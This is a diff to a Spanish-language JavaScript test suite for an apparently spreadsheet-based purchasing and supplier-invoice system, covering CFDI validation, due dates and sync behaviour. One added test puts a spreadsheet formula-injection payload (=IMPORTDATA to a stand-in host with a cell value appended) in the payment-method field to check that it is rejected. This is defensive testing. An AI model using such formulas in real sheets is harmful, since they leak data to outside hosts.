@@ -405,6 +405,9 @@ fx(OC('0001'),{uuid:U(2),receptor:'AAA010101AAA'},/a nombre del RFC AAA010101AAA
 fx(OC('0001'),{uuid:U(2),moneda:'USD'},/es en USD y la orden .* en MXN/);
 fx(OC('0001'),{uuid:U(2),ns:'http://www.sat.gob.mx/cfd/3',version:'3.3'},/CFDI 3\.3/);
 fx(OC('0001'),{uuid:U(2),tipo:'P'},/complemento de pago/);
+fx(OC('0001'),{uuid:U(2),metodo:'=IMPORTDATA(&quot;https://x.example/?d=&quot;&amp;A2)'},/PUE o PPD/);
+fx(OC('0001'),{uuid:U(2),total:'99999.00'},/no cuadra/);
+fx(OC('0001'),{uuid:U(2),subtotal:'400.00',tras:'200.00',total:'600.00'},/supera el total de la orden/);
 fx(OC('0001'),{uuid:U(2),fecha:MANANA+'T09:00:00'},/no puede ser futura/);
 fx(OC('0001'),{uuid:U(2),emisor:'EKU9003173C9'},/ya tiene facturas de RFC PDB200101AB1 \(FPR-\d{4}-0001\)/);
 falla('pedro','registrarFacturaProveedor',[{ocFolio:OC('0001'),xml:{datos:PDF}}],/no es un XML/);
@@ -506,6 +509,17 @@ falla('pedro','registrarPagoProveedor',[{ocFolio:OC('0001'),fecha:HOY_ISO,monto:
 assert.equal(fact(OC('0001'),{uuid:U(2),folio:'2',fecha:diasAtras(100)+'T08:00:00',subtotal:'500.00',tras:'80.00',total:'580.00'}).folio,FPR('0006'));
 assert.equal(ok('pedro','getRequisicion',REQ('0002')).facturaCompleta,true,'completa otra vez');
 assert.equal(FP().length,7,'la cancelada sigue en la hoja');
+assert.equal(filaFpr(FPR('0001'))[20],'PUE');
+
+// --- Orden anterior a los días de crédito (AJ vacía): vence con los días de sus condiciones ("Crédito 30 días") ---
+const filaO5=H('OrdenesCompra').findIndex(x=>x[0]===OC('0005'));
+assert.equal(H('OrdenesCompra')[filaO5][12],'Crédito 30 días'); H('OrdenesCompra')[filaO5][35]='';
+fr=fact(OC('0005'),{uuid:U(7),fecha:diasAtras(10)+'T10:00:00'});
+assert.deepEqual([fr.fechaVencimiento,filaFpr(fr.folio)[7]],[diasAtras(-20),30]);
+// Al cambiar el día, sincronizar vuelve a mandar cuentas por pagar (días vencidos y rangos) aunque nada cambie
+const vDia=ok('pedro','sincronizar',{},{}).versiones;
+assert(!('cxp' in ok('pedro','sincronizar',vDia,{cxp:true,cxpHoy:HOY_ISO})),'mismo día y sin cambios: nada');
+assert(ok('pedro','sincronizar',vDia,{cxp:true,cxpHoy:'2000-01-01'}).cxp.hoy===HOY_ISO,'otro día: la manda');
 
 // --- Quien pide material no ve facturas ni montos; bitácora; nada fuera del libro y la carpeta de compras ---
 assert(!/FPR-|1740|1961/.test(JSON.stringify(ok('obrero','misRequisiciones'))),'el solicitante no ve facturas');
